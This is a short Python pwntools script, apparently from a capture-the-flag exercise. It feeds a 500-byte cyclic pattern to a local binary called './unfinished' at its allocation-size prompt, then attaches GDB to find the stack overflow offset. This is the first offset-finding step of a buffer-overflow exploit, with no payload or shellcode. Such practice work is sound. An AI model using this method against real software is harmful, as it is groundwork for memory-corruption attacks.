#!/usr/bin/env python3
from pwn import *

# Set up pwntools context
context.binary = "./unfinished"
context.log_level = 'info'

# Generate a cyclic pattern for finding offset
pattern = cyclic(500)

# Run the binary
p = process("./unfinished")

# Send the pattern
p.sendlineafter(b"What size allocation?\n", pattern)

# Wait for the crash (this might hang if there's no crash)
try:
    p.wait()
except:
    pass

# Start a debugging session to examine the crash
gdb.attach(p, """
info registers
x/xg $rsp
""")

print("Check GDB output to find the pattern at RSP. Then use:")
print("offset = cyclic_find(pattern_value)")
print("For example: offset = cyclic_find(0x6161616161616168)")

# Keep the script running for GDB
input("Press Enter when done with GDB...") 